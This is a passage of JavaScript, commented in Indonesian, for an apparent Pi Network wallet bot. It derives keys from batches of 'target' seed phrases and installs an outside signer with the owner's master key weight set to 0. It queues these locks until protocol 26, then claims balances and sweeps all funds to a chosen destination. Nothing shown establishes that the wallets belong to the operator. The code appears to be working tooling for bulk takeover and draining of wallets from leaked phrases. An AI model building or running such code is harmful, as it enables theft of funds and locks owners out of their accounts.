    if (index < 0) {
        return null;
    }
    rows[index] = { ...rows[index], ...patch, updated_at: utcIso() };
    await saveMultisigPendingLocks(rows);
    return rows[index];
}

async function queueMultisigInstallLock({
    input,
    fundingInfo,
    fundingPublicKey,
    network,
    horizonUrl,
    horizonUrls = [],
    protocolInfo,
    targetPhrases,
    preparedTargets,
    threshold,
    signerWeight,
    batchSize,
    batchDelayMs,
    baseFee,
}) {
    const rows = await listMultisigPendingLocks();
    const id = crypto.randomUUID();
    const queuedPhrases = preparedTargets.map((target) => targetPhrases[target.line - 1]);
    const targetPublicKeys = preparedTargets.map((target) => target.publicKey);
    const now = utcIso();
    const pending = {
        id,
        status: "waiting_protocol_26",
        network,
        horizon_url: horizonUrl,
        horizon_urls: uniqueMultisigHorizonUrls([...(Array.isArray(horizonUrls) ? horizonUrls : []), horizonUrl]),
        horizon_server_id: String(input.horizon_server_id || "").trim(),
        fee_payer_id: fundingInfo.wallet_id,
        funding_wallet_id: fundingInfo.wallet_id,
        funding_wallet_name: fundingInfo.wallet_name,
        funding_public_key: fundingPublicKey,
        signer_id: input.signer_id || null,
        signer_wallet_id: input.signer_id || null,
        signer_wallet_name: input.signer_label || null,
        signer_public_key: input.signer_public_key || null,
        base_fee_stroops: baseFee,
        batch_size: batchSize,
        batch_delay_ms: batchDelayMs,
        reserve_pi: input.lock_fund_pi ?? input.reserve_pi ?? "0.5",
        threshold,
        signer_weight: signerWeight,
        required_protocol_version: MULTISIG_REQUIRED_PROTOCOL_VERSION,
        current_protocol_version: protocolInfo.current_protocol_version ?? null,
        protocol_info: protocolInfo,
        target_count: targetPublicKeys.length,
        target_public_keys: targetPublicKeys,
        encrypted_target_phrases: encryptMultisigPendingPayload(queuedPhrases),
        created_at: now,
        updated_at: now,
        last_checked_at: protocolInfo.checked_at || now,
        last_error: protocolInfo.error || null,
    };
    rows.push(pending);
    await saveMultisigPendingLocks(rows);

    await Promise.all(preparedTargets.map((target) => upsertMultisigLockedWallet({
        public_key: target.publicKey,
        funding_public_key: fundingPublicKey,
        signer_public_key: input.signer_public_key || fundingPublicKey,
        signer_wallet_id: input.signer_id || null,
        signer_wallet_name: input.signer_label || null,
        network,
        status: "waiting_protocol_26",
        signer_weight: signerWeight,
        low_threshold: threshold,
        med_threshold: threshold,
        high_threshold: threshold,
        master_weight: 1,
        hash: null,
    })));

    broadcastLog(
        `Multisig Install Lock disimpan: ${targetPublicKeys.length} wallet menunggu protocol ${MULTISIG_REQUIRED_PROTOCOL_VERSION}`,
        "warning"
    );

    return pending;
}

async function deleteMultisigLockedWalletEntry({ publicKey, fundingPublicKey = "", network = "" }) {
    const normalizedPublicKey = String(publicKey || "").trim();
    if (!normalizedPublicKey) {
        throw new Error("Public key wallet wajib diisi");
    }
    const normalizedFunding = String(fundingPublicKey || "").trim();
    const normalizedNetwork = network ? normalizeMultisigNetwork(network) : "";

    const rows = await listMultisigLockedWallets();
    const kept = [];
    let removedCount = 0;
    for (const row of rows) {
        const matchesPublic = String(row.public_key || "") === normalizedPublicKey;
        const matchesFunding = !normalizedFunding || String(row.funding_public_key || "") === normalizedFunding;
        const matchesNetwork = !normalizedNetwork || normalizeMultisigNetwork(row.network) === normalizedNetwork;
        if (matchesPublic && matchesFunding && matchesNetwork) {
            removedCount += 1;
        } else {
            kept.push(row);
        }
    }
    await saveMultisigLockedWallets(kept);

    let pendingRemoved = 0;
    const pendingRows = await listMultisigPendingLocks();
    const nextPendingRows = [];
    for (const pending of pendingRows) {
        const status = String(pending.status || "");
        const canEditPending = ["waiting_protocol_26", "queued", "error"].includes(status);
        const matchesFunding = !normalizedFunding || String(pending.funding_public_key || "") === normalizedFunding;
        const matchesNetwork = !normalizedNetwork || normalizeMultisigNetwork(pending.network) === normalizedNetwork;
        const targetPublicKeys = Array.isArray(pending.target_public_keys) ? pending.target_public_keys : [];
        const targetIndex = targetPublicKeys.indexOf(normalizedPublicKey);
        if (!canEditPending || !matchesFunding || !matchesNetwork || targetIndex < 0) {
            nextPendingRows.push(pending);
            continue;
        }

        pendingRemoved += 1;
        const phrases = decryptMultisigPendingPayload(pending.encrypted_target_phrases) || [];
        const nextKeys = targetPublicKeys.filter((_, index) => index !== targetIndex);
        const nextPhrases = phrases.filter((_, index) => index !== targetIndex);
        if (!nextKeys.length) {
            nextPendingRows.push({
                ...pending,
                status: "cancelled",
                target_count: 0,
                target_public_keys: [],
                encrypted_target_phrases: encryptMultisigPendingPayload([]),
                updated_at: utcIso(),
                last_error: "Semua target pending sudah dihapus dari Locked Wallet List",
            });
        } else {
            nextPendingRows.push({
                ...pending,
                target_count: nextKeys.length,
                target_public_keys: nextKeys,
                encrypted_target_phrases: encryptMultisigPendingPayload(nextPhrases),
                updated_at: utcIso(),
            });
        }
    }
    await saveMultisigPendingLocks(nextPendingRows);

    return { removed_count: removedCount, pending_removed_count: pendingRemoved };
}

let multisigProtocolWatcherStarted = false;
let multisigProtocolWatcherRunning = false;

async function processMultisigPendingLocksOnce() {
    if (multisigProtocolWatcherRunning || !redisClient.isOpen) {
        return;
    }
    multisigProtocolWatcherRunning = true;
    try {
        const pendingRows = await listMultisigPendingLocks();
        for (const pending of pendingRows.filter((row) => String(row.status || "") === "waiting_protocol_26")) {
            const horizonUrls = uniqueMultisigHorizonUrls([...(Array.isArray(pending.horizon_urls) ? pending.horizon_urls : []), pending.horizon_url]);
            const protocolInfo = await fetchMultisigProtocolInfoWithFallback(horizonUrls, pending.required_protocol_version || MULTISIG_REQUIRED_PROTOCOL_VERSION);
            await updateMultisigPendingLock(pending.id, {
                horizon_url: protocolInfo.horizon_url || pending.horizon_url,
                horizon_urls: horizonUrls,
                current_protocol_version: protocolInfo.current_protocol_version ?? null,
                protocol_info: protocolInfo,
                last_checked_at: protocolInfo.checked_at,
                last_error: protocolInfo.error || null,
            });
            if (!protocolInfo.ready) {
                continue;
            }

            await notifyMultisigProtocolReadyTelegram(pending, protocolInfo);
            await updateMultisigPendingLock(pending.id, { status: "processing", last_error: null });
            broadcastLog(
                `Protocol ${protocolInfo.current_protocol_version} aktif via ${protocolInfo.horizon_url}. Menjalankan pending Multisig Install Lock ${pending.target_count || 0} wallet...`,
                "warning"
            );
            try {
                const targetPhrases = decryptMultisigPendingPayload(pending.encrypted_target_phrases) || [];
                if (!targetPhrases.length) {
                    throw new Error("Pending target phrase kosong atau tidak bisa didekripsi");
                }
                const result = await executeMultisigInstallLock({
                    fee_payer_id: pending.fee_payer_id || pending.funding_wallet_id,
                    network: pending.network,
                    horizon_url: protocolInfo.horizon_url || pending.horizon_url,
                    horizon_urls: horizonUrls,
                    horizon_server_id: pending.horizon_server_id || "",
                    base_fee_stroops: pending.base_fee_stroops,
                    batch_size: pending.batch_size || MULTISIG_BATCH_SIZE,
                    batch_delay_ms: pending.batch_delay_ms ?? MULTISIG_BATCH_DELAY_MS,
                    reserve_pi: pending.reserve_pi || "0.5",
                    threshold: pending.threshold,
                    signer_weight: pending.signer_weight,
                    signer_id: pending.signer_id || pending.signer_wallet_id || "",
                    signer_public_key: pending.signer_public_key || "",
                    signer_label: pending.signer_wallet_name || "Signer Wallet",
                    target_phrases: targetPhrases.join("\n"),
                    skip_protocol_wait: true,
                });
                await updateMultisigPendingLock(pending.id, {
                    status: "completed",
                    completed_at: utcIso(),
                    success_count: result.success_count,
                    total: result.total,
                    last_hash: (result.results || []).find((item) => item.hash)?.hash || null,
                    last_error: result.success_count ? null : "Protocol sudah 26, tetapi tidak ada target yang berhasil di-lock",
                });
                broadcastLog(`Pending Multisig Install Lock selesai: ${result.success_count}/${result.total} berhasil`, result.success_count ? "success" : "warn");
            } catch (err) {
                await updateMultisigPendingLock(pending.id, {
                    status: "waiting_protocol_26",
                    last_error: err.message || String(err),
                });
                broadcastLog(`Pending Multisig Install Lock gagal: ${err.message || err}`, "error");
            }
        }
    } finally {
        multisigProtocolWatcherRunning = false;
    }
}

function startMultisigProtocolWatcher() {
    if (multisigProtocolWatcherStarted) {
        return;
    }
    multisigProtocolWatcherStarted = true;
    setTimeout(() => processMultisigPendingLocksOnce().catch((err) => console.log(`Multisig protocol watcher error: ${err.message}`)), 3000);
    setInterval(() => {
        processMultisigPendingLocksOnce().catch((err) => console.log(`Multisig protocol watcher error: ${err.message}`));
    }, MULTISIG_PROTOCOL_WATCH_INTERVAL_MS);
}

async function executeMultisigInstallLock(input) {
    const sdk = requireStellarSdk();
    const fundingInfo = await getMultisigFundingKeypair(input);
    const fundingKeypair = fundingInfo.keypair;
    const fundingPublicKey = fundingInfo.public_key;
    const signerInfo = await getMultisigSignerPublic(input);
    const signerPublicKey = signerInfo.public_key;
    if (signerPublicKey === fundingPublicKey) {
        throw new Error("Signer Wallet harus berbeda dari Funding Wallet agar funding hanya bayar fee");
    }
    const { network, networkPassphrase, horizonUrl, horizonUrls } = await resolveMultisigNetworkConfig(input);
    const server = new sdk.Horizon.Server(horizonUrl);
    const baseFee = String(parseMultisigInteger(input.base_fee_stroops, 100000, 100, 10000000, "Base fee stroops"));
    const batchSize = getMultisigBatchSize(input);
    const batchDelayMs = getMultisigBatchDelayMs(input);
    const signerWeight = parseMultisigInteger(input.signer_weight, 5, 1, 255, "Signer weight");
    const threshold = parseMultisigInteger(input.threshold, 5, 1, 255, "Threshold");
    const installFundAmount = formatStroopsToPi(parsePiAmountToStroops(String(input.lock_fund_pi ?? input.reserve_pi ?? "0.5"), "Install Lock Fund PI"));
    const targetPhrases = normalizeMultisigLines(input.target_phrases);
    if (!targetPhrases.length) {
        throw new Error("List phrase locked wajib diisi");
    }
    const reportProgress = async (progress = {}) => {
        if (typeof input.on_progress !== "function") {
            return;
        }
        try {
            await input.on_progress(progress);
        } catch (err) {
            console.log(`Multisig progress update gagal: ${err.message || err}`);
        }
    };
    const isStopRequested = () => {
        try {
            return typeof input.should_stop === "function" && input.should_stop();
        } catch (err) {
            return false;
        }
    };

    const results = [];
    const preparedTargets = [];
    const seenPublicKeys = new Set();

    const markUnprocessedTargetsStopped = () => {
        for (let index = results.length; index < targetPhrases.length; index += 1) {
            results.push({
                line: index + 1,
                success: false,
                stopped: true,
                error: "Dihentikan oleh admin sebelum diproses",
            });
        }
        results.forEach((item) => {
            if (!item.success && String(item.error || "") === "Belum diproses") {
                item.stopped = true;
                item.error = "Dihentikan oleh admin sebelum diproses";
            }
        });
    };

    const buildStoppedInstallResult = async (extra = {}) => {
        markUnprocessedTargetsStopped();
        const successCount = results.filter((item) => item.success).length;
        const failedCount = results.filter((item) => !item.success && !item.stopped && item.error && item.error !== "Belum diproses").length;
        const stoppedCount = results.filter((item) => item.stopped).length;
        await reportProgress({
            stage: "stopped",
            total: results.length || targetPhrases.length,
            valid: preparedTargets.length,
            success: successCount,
            failed: failedCount,
            stopped: stoppedCount,
            ...extra,
        });
        return {
            stopped: true,
            status: "stopped",
            stopped_at: utcIso(),
            funding_public_key: fundingPublicKey,
            funding_wallet_id: fundingInfo.wallet_id,
            funding_wallet_name: fundingInfo.wallet_name,
            signer_public_key: signerPublicKey,
            signer_wallet_id: signerInfo.signer_id || null,
            signer_wallet_name: signerInfo.signer_name || null,
            network,
            horizon_url: horizonUrl,
            horizon_urls: horizonUrls,
            batch_size: batchSize,
            batch_mode: "parallel_isolated_wallet",
            batch_delay_ms: batchDelayMs,
            batch_count: extra.batch_count || 0,
            total: results.length || targetPhrases.length,
            success_count: successCount,
            failed_count: failedCount,
            stopped_count: stoppedCount,
            results,
        };
    };

    await reportProgress({ stage: "prepare", total: targetPhrases.length, processed: 0, success: 0, failed: 0 });

    for (let index = 0; index < targetPhrases.length; index += 1) {
        if (isStopRequested()) {
            return buildStoppedInstallResult({ processed: index });
        }
        const lineNo = index + 1;
        const resultIndex = results.length;
        results.push({ line: lineNo, success: false, error: "Belum diproses" });
        try {
            const targetKeypair = deriveKeypairFromMnemonic(targetPhrases[index]);
            const publicKey = targetKeypair.publicKey();
            if (publicKey === fundingPublicKey) {
                throw new Error("Funding phrase tidak boleh masuk ke list phrase locked");
            }
            if (publicKey === signerPublicKey) {
                throw new Error("Signer phrase tidak boleh masuk ke list phrase locked");
            }
            if (seenPublicKeys.has(publicKey)) {
                throw new Error("Duplikat target wallet");
            }
            seenPublicKeys.add(publicKey);
            await callMultisigWithHorizonFallback({
                sdk,
                horizonUrls,
                label: `load target ${String(publicKey).slice(0, 8)}...`,
                action: async (activeServer) => activeServer.accounts().accountId(publicKey).call(),
            });
            preparedTargets.push({ line: lineNo, resultIndex, publicKey, targetKeypair });
        } catch (err) {
            results[resultIndex] = { line: lineNo, success: false, error: err.message || String(err) };
        }
        const processedPrepare = index + 1;
        if (processedPrepare === 1 || processedPrepare === targetPhrases.length || processedPrepare % 25 === 0) {
            await reportProgress({
                stage: "prepare",
                total: targetPhrases.length,
                processed: processedPrepare,
                valid: preparedTargets.length,
                failed: results.filter((item) => item.error && item.error !== "Belum diproses" && !item.success).length,
            });
        }
    }

    if (isStopRequested()) {
        return buildStoppedInstallResult({ processed: targetPhrases.length });
    }

    await reportProgress({
        stage: "protocol",
        total: targetPhrases.length,
        processed: targetPhrases.length,
        valid: preparedTargets.length,
        failed: results.filter((item) => item.error && item.error !== "Belum diproses" && !item.success).length,
    });

    if (isStopRequested()) {
        return buildStoppedInstallResult({ processed: targetPhrases.length });
    }

    if (!input.skip_protocol_wait) {
        const protocolInfo = await fetchMultisigProtocolInfoWithFallback(horizonUrls, MULTISIG_REQUIRED_PROTOCOL_VERSION);
        if (!protocolInfo.ready) {
            // Protocol belum mencapai target: simpan semua phrase valid ke pending queue.
            // Bot tidak menjalankan Install Lock sekarang; watcher akan eksekusi batch setelah protocol ready.
            let pending = null;
            if (preparedTargets.length) {
                pending = await queueMultisigInstallLock({
                    input: {
                        ...input,
                        signer_id: signerInfo.signer_id || input.signer_id || "",
                        signer_public_key: signerPublicKey,
                        signer_label: signerInfo.signer_name || input.signer_label || "Signer Wallet",
                    },
                    fundingInfo,
                    fundingPublicKey,
                    network,
                    horizonUrl: protocolInfo.horizon_url || horizonUrl,
                    horizonUrls,
                    protocolInfo,
                    targetPhrases,
                    preparedTargets,
                    threshold,
                    signerWeight,
                    batchSize,
                    batchDelayMs,
                    baseFee,
                });
            }
            for (const target of preparedTargets) {
                results[target.resultIndex] = {
                    line: target.line,
                    success: false,
                    queued: true,
                    public_key: target.publicKey,
                    status: "waiting_protocol_26",
                    error: `Menunggu protocol ${MULTISIG_REQUIRED_PROTOCOL_VERSION}. Current protocol ${protocolInfo.current_protocol_version ?? "unknown"}.`,
                };
            }
            await reportProgress({
                stage: "queued",
                total: results.length,
                valid: preparedTargets.length,
                queued: preparedTargets.length,
                failed: results.filter((item) => item.error && item.error !== "Belum diproses" && !item.success).length,
                protocol: protocolInfo,
            });
            return {
                queued: Boolean(pending),
                pending_id: pending?.id || null,
                status: "waiting_protocol_26",
                funding_public_key: fundingPublicKey,
                funding_wallet_id: fundingInfo.wallet_id,
                funding_wallet_name: fundingInfo.wallet_name,
                network,
                horizon_url: protocolInfo.horizon_url || horizonUrl,
                horizon_urls: horizonUrls,
                protocol: protocolInfo,
                batch_size: batchSize,
                batch_mode: "parallel_isolated_wallet",
                batch_delay_ms: batchDelayMs,
                batch_count: 0,
                total: results.length,
                success_count: 0,
                queued_count: preparedTargets.length,
                results,
            };
        }
    }

    if (isStopRequested()) {
        return buildStoppedInstallResult({ processed: targetPhrases.length });
    }

    const makeInstallOperation = (target) =>
        sdk.Operation.setOptions({
            source: target.publicKey,
            signer: { ed25519PublicKey: signerPublicKey, weight: signerWeight },
            masterWeight: 0,
            lowThreshold: threshold,
            medThreshold: threshold,
            highThreshold: threshold,
        });

    const saveInstallSuccess = async (target, hash, batchNo) => {
        const saved = await upsertMultisigLockedWallet({
            public_key: target.publicKey,
            funding_public_key: fundingPublicKey,
            signer_public_key: signerPublicKey,
            signer_wallet_id: signerInfo.signer_id || null,
            signer_wallet_name: signerInfo.signer_name || null,
            network,
            status: "locked_by_signer",
            signer_weight: signerWeight,
            low_threshold: threshold,
            med_threshold: threshold,
            high_threshold: threshold,
            master_weight: 0,
            hash,
        });
        results[target.resultIndex] = {
            line: target.line,
            success: true,
            public_key: target.publicKey,
            signer_public_key: signerPublicKey,
            hash,
            status: saved.status,
            batch_no: batchNo,
            fund_pi: installFundAmount,
        };
    };

    const batches = chunkMultisigItems(preparedTargets, batchSize);
    await reportProgress({
        stage: "batches_ready",
        total: results.length,
        valid: preparedTargets.length,
        failed: results.filter((item) => item.error && item.error !== "Belum diproses" && !item.success).length,
        batch_count: batches.length,
        batch_size: batchSize,
        batch_mode: "parallel_isolated_wallet",
        batch_delay_ms: batchDelayMs,
    });
    broadcastLog(
        `Multisig Install Lock mulai batch paralel: ${preparedTargets.length} wallet, concurrency ${batchSize}, delay ${Math.round(batchDelayMs / 1000)} detik`,
        "info"
    );
    for (let batchIndex = 0; batchIndex < batches.length; batchIndex += 1) {
        if (isStopRequested()) {
            return buildStoppedInstallResult({ batch_count: batches.length, batch_no: batchIndex, processed: results.filter((item) => item.success || item.error !== "Belum diproses").length });
        }
        const batchNo = batchIndex + 1;
        const batch = batches[batchIndex];
        if (!batch.length) {
            continue;
        }
        await reportProgress({
            stage: "batch_start",
            batch_no: batchNo,
            batch_count: batches.length,
            batch_size: batch.length,
            batch_mode: "parallel_isolated_wallet",
            total: results.length,
            valid: preparedTargets.length,
            success: results.filter((item) => item.success).length,
            failed: results.filter((item) => item.error && item.error !== "Belum diproses" && !item.success).length,
            batch_delay_ms: batchDelayMs,
        });
        // Mode Install Lock paralel terisolasi seperti Auto Sweep Helper:
        // batch adalah batas concurrency. Setiap wallet tetap TX sendiri, tetapi semua wallet dalam batch jalan bersamaan.
        // Jika 1 wallet gagal, Promise.allSettled tetap menunggu wallet lain dan batch berikutnya tetap lanjut.
        const settled = await Promise.allSettled(batch.map(async (target) => {
            if (isStopRequested()) {
                const stopError = new Error("Dihentikan oleh admin sebelum wallet dikirim");
                stopError.stopped = true;
                throw stopError;
            }
            const response = await submitMultisigInstallLockSingleParallel({
                sdk,
                server,
                horizonUrls,
                fundingKeypair,
                fundingPublicKey,
                targetKeypair: target.targetKeypair,
                targetPublicKey: target.publicKey,
                networkPassphrase,
                baseFee,
                operation: makeInstallOperation(target),
                fundTargetAmount: installFundAmount,
                memo: "Signer",
            });
            await saveInstallSuccess(target, response.hash, batchNo);
            return { target, response };
        }));

        settled.forEach((item, index) => {
            const target = batch[index];
            if (item.status === "fulfilled") {
                return;
            }
            results[target.resultIndex] = {
                line: target.line,
                success: false,
                public_key: target.publicKey,
                batch_no: batchNo,
                stopped: Boolean(item.reason?.stopped),
                error: formatMultisigHorizonError(item.reason),
            };
        });

        await reportProgress({
            stage: "batch_start",
            batch_no: batchNo,
            batch_count: batches.length,
            batch_size: batch.length,
            batch_mode: "parallel_isolated_wallet",
            total: results.length,
            valid: preparedTargets.length,
            success: results.filter((item) => item.success).length,
            failed: results.filter((item) => item.error && item.error !== "Belum diproses" && !item.success && !item.stopped).length,
            stopped: results.filter((item) => item.stopped).length || undefined,
            processed: results.filter((item) => item.success || item.error !== "Belum diproses").length,
            batch_delay_ms: batchDelayMs,
        });
        await reportProgress({
            stage: "batch_done",
            batch_no: batchNo,
            batch_count: batches.length,
            batch_size: batch.length,
            batch_mode: "parallel_isolated_wallet",
            total: results.length,
            valid: preparedTargets.length,
            success: results.filter((item) => item.success).length,
            failed: results.filter((item) => item.error && item.error !== "Belum diproses" && !item.success).length,
            batch_delay_ms: batchDelayMs,
        });
        if (isStopRequested()) {
            return buildStoppedInstallResult({ batch_count: batches.length, batch_no: batchNo });
        }
        if (batchIndex < batches.length - 1 && batchDelayMs > 0) {
            await reportProgress({
                stage: "delay",
                batch_no: batchNo,
                batch_count: batches.length,
                total: results.length,
                success: results.filter((item) => item.success).length,
                failed: results.filter((item) => item.error && item.error !== "Belum diproses" && !item.success).length,
                batch_delay_ms: batchDelayMs,
            });
        }
        const stoppedDuringDelay = await waitMultisigBatchDelayWithStop(batchIndex, batches.length, batchDelayMs, "Multisig Install Lock", isStopRequested);
        if (stoppedDuringDelay) {
            return buildStoppedInstallResult({ batch_count: batches.length, batch_no: batchNo });
        }
    }

    await reportProgress({
        stage: "completed",
        total: results.length,
        valid: preparedTargets.length,
        success: results.filter((item) => item.success).length,
        failed: results.filter((item) => item.error && item.error !== "Belum diproses" && !item.success).length,
        batch_count: batches.length,
    });

    return {
        funding_public_key: fundingPublicKey,
        funding_wallet_id: fundingInfo.wallet_id,
        funding_wallet_name: fundingInfo.wallet_name,
        signer_public_key: signerPublicKey,
        signer_wallet_id: signerInfo.signer_id || null,
        signer_wallet_name: signerInfo.signer_name || null,
        network,
        horizon_url: horizonUrl,
        horizon_urls: horizonUrls,
        batch_size: batchSize,
        batch_mode: "parallel_isolated_wallet",
        batch_delay_ms: batchDelayMs,
        batch_count: batches.length,
        total: results.length,
        success_count: results.filter((item) => item.success).length,
        results,
    };
}

async function executeMultisigFundingAction(input) {
    const sdk = requireStellarSdk();
    const fundingInfo = await getMultisigFundingKeypair(input);
    const fundingKeypair = fundingInfo.keypair;
    const fundingPublicKey = fundingInfo.public_key;
    const signerInfo = await getMultisigSignerKeypair(input);
    const signerKeypair = signerInfo.keypair;
    const signerPublicKey = signerInfo.public_key;
    if (signerPublicKey === fundingPublicKey) {
        throw new Error("Signer Wallet harus berbeda dari Funding Wallet agar funding hanya bayar fee");
    }
    const { network, networkPassphrase, horizonUrl, horizonUrls } = await resolveMultisigNetworkConfig(input);
    const server = new sdk.Horizon.Server(horizonUrl);
    const mode = String(input.mode || "").trim();
    if (!["claim_only", "send_only", "claim_and_send", "sweep_all", "remove_signer"].includes(mode)) {
        throw new Error("Mode multisig tidak valid");
    }
    const effectiveMode = mode === "sweep_all" ? "send_only" : mode;
    const baseFee = String(parseMultisigInteger(input.base_fee_stroops, 100000, 100, 10000000, "Base fee stroops"));
    const batchSize = getMultisigBatchSize(input);
    const batchDelayMs = getMultisigBatchDelayMs(input);
    const reportProgress = async (progress = {}) => {
        if (typeof input.on_progress !== "function") {
            return;
        }
        try {
            await input.on_progress(progress);
        } catch (err) {
            console.log(`Multisig action progress update gagal: ${err.message || err}`);
        }
    };
    const isStopRequested = () => {
        try {
            return typeof input.should_stop === "function" && input.should_stop();
        } catch (_err) {
            return false;
        }
    };
    const reserveStroops = parsePiAmountToStroops(String(input.reserve_pi || "0.5"), "Reserve PI");
    const needsPayment = effectiveMode === "send_only" || effectiveMode === "claim_and_send";
    const removeSignerMode = effectiveMode === "remove_signer";
    const destination = String(input.destination || "").trim();
    if (needsPayment) {
        try {
            StellarKeypair.fromPublicKey(destination);
        } catch (err) {
            throw new Error("Destination wallet tidak valid");
        }
    }

    await reportProgress({ stage: "prepare", total: 0, processed: 0, success: 0, failed: 0, batch_mode: "parallel_isolated_wallet" });

    let targets = normalizeMultisigTargets(input.target_public_keys);
    if (!targets.length) {
        const stored = await listMultisigLockedWallets();
        targets = stored
            .filter((row) =>
                row.network === network &&
                row.funding_public_key === fundingPublicKey &&
                String(row.signer_public_key || row.funding_public_key || "") === signerPublicKey &&
                String(row.status || "") !== "signer_removed"
            )
            .map((row) => row.public_key);
    }
    targets = [...new Set(targets)];
    if (!targets.length) {
        throw new Error("Tidak ada locked wallet target untuk kombinasi Funding + Signer ini");
    }

    await reportProgress({
        stage: "prepare",
        total: targets.length,
        processed: 0,
        valid: targets.length,
        success: 0,
        failed: 0,
        batch_mode: "parallel_isolated_wallet",
    });

    const baseReserveCall = await callMultisigWithHorizonFallback({
        sdk,
        horizonUrls,
        label: "base reserve",
        action: async (activeServer) => withMultisigActionTimeout(
            fetchMultisigBaseReserveStroops(activeServer, reserveStroops),
            "Load base reserve"
        ),
    });
    const baseReserveStroops = baseReserveCall.result;
    const fixedAmountText = mode === "sweep_all" ? "ALL" : String(input.amount || "").trim();
    const useAllAvailable = !fixedAmountText || /^all$/i.test(fixedAmountText);
    const fixedAmountStroops = useAllAvailable ? null : parsePiAmountToStroops(fixedAmountText, "Amount");
    const results = [];

    const prepareTargetAction = async (publicKey, index) => {
        try {
            StellarKeypair.fromPublicKey(publicKey);
            const targetAccountCall = await callMultisigWithHorizonFallback({
                sdk,
                horizonUrls,
                label: `load target ${String(publicKey).slice(0, 8)}...`,
                action: async (activeServer) => withMultisigActionTimeout(
                    activeServer.accounts().accountId(publicKey).call(),
                    `Load target ${String(publicKey).slice(0, 8)}...`
                ),
            });
            const targetAccountData = targetAccountCall.result;
            const operations = [];
            let selectedClaims = [];

            if (removeSignerMode) {
                operations.push(
                    sdk.Operation.setOptions({
                        source: publicKey,
                        signer: { ed25519PublicKey: signerPublicKey, weight: 0 },
                        masterWeight: 1,
                        lowThreshold: 0,
                        medThreshold: 0,
                        highThreshold: 0,
                    })
                );
            } else {
                const activeClaims = effectiveMode === "send_only" ? [] : await fetchActiveNativeClaimablesForMultisigWithFallback(sdk, publicKey, horizonUrls);
                const claimLimit = effectiveMode === "claim_and_send" ? 99 : 100;
                selectedClaims = activeClaims.slice(0, claimLimit);
                for (const record of selectedClaims) {
                    operations.push(sdk.Operation.claimClaimableBalance({ balanceId: record.id, source: publicKey }));
                }
            }

            let sendAmountStroops = 0n;
            if (needsPayment) {
                const currentBalance = nativeBalanceStroopsFromAccount(targetAccountData);
                const claimAmount = selectedClaims.reduce((sum, record) => sum + parsePiAmountToStroops(record.amount, "Claim amount"), 0n);
                const effectiveReserve = accountMinimumReserveStroops(targetAccountData, baseReserveStroops, reserveStroops);
                const availableToSend = currentBalance + claimAmount - effectiveReserve;
                if (useAllAvailable) {
                    sendAmountStroops = availableToSend;
                } else {
                    sendAmountStroops = fixedAmountStroops;
                    if (sendAmountStroops > availableToSend) {
                        return {
                            ok: false,
                            result: {
                                index: index + 1,
                                success: false,
                                public_key: publicKey,
                                error: `Saldo tidak cukup. Available ${formatStroopsToPi(availableToSend > 0n ? availableToSend : 0n)} PI setelah reserve ${formatStroopsToPi(effectiveReserve)} PI`,
                            },
                        };
                    }
                }
                if (sendAmountStroops <= 0n) {
                    if (!operations.length) {
                        return { ok: false, result: { index: index + 1, success: false, public_key: publicKey, error: "Saldo tidak cukup setelah reserve" } };
                    }
                } else {
                    operations.push(
                        sdk.Operation.payment({
                            destination,
                            asset: sdk.Asset.native(),
                            amount: formatStroopsToPi(sendAmountStroops),
                            source: publicKey,
                        })
                    );
                }
            }

            if (!operations.length) {
                return { ok: false, result: { index: index + 1, success: false, public_key: publicKey, error: "Tidak ada operasi untuk dikirim" } };
            }
            if (operations.length > 100) {
                return { ok: false, result: { index: index + 1, success: false, public_key: publicKey, error: "Operasi target melebihi 100 per transaksi" } };
            }

            return {
                ok: true,
                action: {
                    index,
                    publicKey,
                    operations,
                    claims: selectedClaims.length,
                    sendAmountStroops,
                    removeSignerMode,
                },
            };
        } catch (err) {
            return { ok: false, result: { index: index + 1, success: false, public_key: publicKey, error: err.message || String(err) } };
        }
    };

    const submitActionBatch = async (actions, batchNo) => {
        if (!actions.length) {
            return;
        }
        // Batch paralel seperti Install Lock:
        // setiap wallet memakai sequence akun target dan funding hanya menjadi fee-bump payer.
        // Jadi Sweep All / Tarik Semua Aset tidak bentrok sequence funding saat batch jalan bersamaan.
        const settled = await Promise.allSettled(actions.map(async (action) => {
            if (isStopRequested()) {
                return {
                    index: action.index + 1,
                    success: false,
                    stopped: true,
                    public_key: action.publicKey,
                    batch_no: batchNo,
                    error: "Dihentikan oleh admin sebelum dikirim",
                };
            }

            const response = await submitMultisigTargetOperationFeeBumpParallel({
                sdk,
                horizonUrls,
                fundingKeypair,
                fundingPublicKey,
                targetPublicKey: action.publicKey,
                networkPassphrase,
                baseFee,
                operations: action.operations,
                extraSigners: [signerKeypair],
                memo: "Signer",
            });
            if (removeSignerMode) {
                await markMultisigSignerRemoved({
                    public_key: action.publicKey,
                    funding_public_key: fundingPublicKey,
                    signer_public_key: signerPublicKey,
                    signer_wallet_id: signerInfo.signer_id || null,
                    signer_wallet_name: signerInfo.signer_name || null,
                    network,
                    hash: response.hash,
                });
            }
            return {
                index: action.index + 1,
                success: true,
                public_key: action.publicKey,
                signer_public_key: signerPublicKey,
                hash: response.hash,
                claims: action.claims,
                sent_pi: needsPayment && action.sendAmountStroops > 0n ? formatStroopsToPi(action.sendAmountStroops) : "0.0000000",
                action: removeSignerMode ? "signer_removed" : mode,
                batch_no: batchNo,
                batch_size: actions.length,
                parallel_batch: true,
                fee_bump_payer: fundingPublicKey,
            };
        }));

        settled.forEach((item, offset) => {
            if (item.status === "fulfilled") {
                results.push(item.value);
                return;
            }
            const action = actions[offset];
            results.push({
                index: action.index + 1,
                success: false,
                public_key: action.publicKey,
                batch_no: batchNo,
                batch_size: actions.length,
                parallel_batch: true,
                error: item.reason?.message || String(item.reason || "Gagal submit"),
            });
        });
    };

    const targetBatches = chunkMultisigItems(targets, batchSize);
    await reportProgress({
        stage: "batches_ready",
        total: targets.length,
        valid: targets.length,
        success: 0,
        failed: 0,
        batch_count: targetBatches.length,
        batch_size: batchSize,
        batch_mode: "parallel_isolated_wallet",
        batch_delay_ms: batchDelayMs,
    });

    for (let batchIndex = 0; batchIndex < targetBatches.length; batchIndex += 1) {
        if (isStopRequested()) {
            break;
        }
        const batchNo = batchIndex + 1;
        const batch = targetBatches[batchIndex];
        await reportProgress({
            stage: "batch_start",
            batch_no: batchNo,
            batch_count: targetBatches.length,
            batch_size: batch.length,
            batch_mode: "parallel_isolated_wallet",
            total: targets.length,
            valid: targets.length,
            success: results.filter((item) => item.success).length,
            failed: results.filter((item) => !item.success).length,
            processed: results.length,
            batch_delay_ms: batchDelayMs,
        });

